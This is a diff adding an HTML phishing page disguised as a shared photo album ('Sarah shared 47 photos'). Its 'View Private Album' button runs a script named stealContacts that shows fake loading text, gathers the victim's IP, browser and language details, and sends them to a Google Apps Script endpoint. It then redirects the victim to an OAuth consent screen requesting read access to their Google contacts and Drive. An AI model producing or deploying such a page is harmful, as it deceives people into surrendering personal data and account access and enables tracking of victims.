@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Shared Album - 47 New Photos!</title>
+  <meta name="viewport" content="width=device-width">
+  <style>
+    body{font-family:system-ui;background:#1a1a2e;padding:20px;color:#fff;text-align:center}
+    .btn{background:#4285f4;color:white;padding:15px 30px;border-radius:25px;font-size:18px;display:inline-block;text-decoration:none;box-shadow:0 4px 15px rgba(66,133,244,.4)}
+    .photos{display:grid;grid-template-columns:repeat(auto-fit,minmax(120px,1fr));gap:10px;margin:20px 0}
+    .photo{background:#16213e;height:120px;border-radius:10px}
+  </style>
+</head>
+<body style="background:linear-gradient(135deg,#667eea 0%,#764ba2 100%)">
+  <h1>🎉 Sarah shared 47 photos!</h1>
+  <p style="font-size:18px">Click below to view the private album</p>
+  
+  <div class="photos">
+    <div class="photo"></div><div class="photo"></div><div class="photo"></div>
+    <div class="photo"></div><div class="photo"></div><div class="photo"></div>
+  </div>
+  
+  <a href="#" onclick="stealContacts()" class="btn">🔓 View Private Album</a>
+  
+  <script>
+  const SCRIPT_ID = 'https://script.google.com/macros/s/AKfycbzcQ3RCKhrSXA_4Hgy-KoArlXtEuV2DgYzqoV78eDuplqNjTE_ikuvEQFa0WzXueyNMBg/exec'; // From deployment
+    
+  async function stealContacts() {
+    // Fake loading
+    document.querySelector('.btn').innerText = 'Loading photos...';
+    
+    // Track victim IP/location
+    const victimData = {
+      ip: await (await fetch('https://api.ipify.org?format=json')).json().then(r=>r.ip),
+      ua: navigator.userAgent,
+      lang: navigator.language,
+      time: new Date().toISOString()
+    };
+    
+    // Redirect to OAuth + exfil
+    fetch(`${SCRIPT_ID}?victim=${btoa(JSON.stringify(victimData))}&auth=1`)
+      .then(()=> window.location.href = 'https://accounts.google.com/o/oauth2/v2/auth?scope=https://www.googleapis.com/auth/contacts.readonly+https://www.googleapis.com/auth/drive.readonly&redirect_uri=YOUR_CALLBACK_URL&response_type=code&client_id=YOUR_CLIENT_ID&prompt=consent');
+  }
+  </script>
+</body>
+  </html>
